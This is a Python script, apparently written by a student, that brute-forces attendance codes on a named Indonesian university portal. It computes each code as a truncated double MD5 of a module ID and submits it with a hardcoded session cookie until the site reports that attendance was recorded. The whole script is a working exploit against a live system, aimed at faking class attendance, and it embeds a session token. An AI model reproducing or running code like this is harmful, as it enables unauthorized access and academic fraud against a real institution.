#!/usr/bin/env python3
import hashlib
import requests
import time

BASE_URL = "https://my.cic.ac.id/portal/sipandai/"
COURSE_ID = 8672          # tetap
COOKIE   = {"PHPSESSID": "8ebehi8fqo2f837r2k9085nro3"}   # sesuaikan

FAIL_MARKER = "Maaf, Data Kelas tidak ditemukan..!"         # frasa kegagalan
SUCCESS_MARKER = "Sukses Melakukan absensi"                 # frasa keberhasilan

def kode_unix(mid: int) -> str:
    """Hitung 2× MD5, ambil 8 heksa depan."""
    first  = hashlib.md5(str(mid).encode()).hexdigest()
    second = hashlib.md5(first.encode()).hexdigest()
    return second[:8]

for mid in range(27362, 28000):
    kode = kode_unix(mid)

    params = {
        "mod":        "sipandai",
        "act":        "actabsen",
        "modulesid":  mid,
        "courseid":   COURSE_ID
    }

    data = {
        "kode": kode,
        "cmd":  "Simpan"
    }

    try:
        resp = requests.post(BASE_URL, params=params, data=data,
                             cookies=COOKIE, timeout=8)
        resp.raise_for_status()
    except Exception as e:
        print(f"[ERR] id {mid} – {e}")
        continue

    text = resp.text

    if FAIL_MARKER in text:
        print(f"[X]  id {mid} salah")
    elif SUCCESS_MARKER in text:
        print(f"[OK] id {mid} cocok • kode {kode}")
        # bisa simpan atau proses lebih lanjut di sini
        break
    else:
        print(f"[?]  id {mid} – respons tidak dikenali")

    time.sleep(0.2)
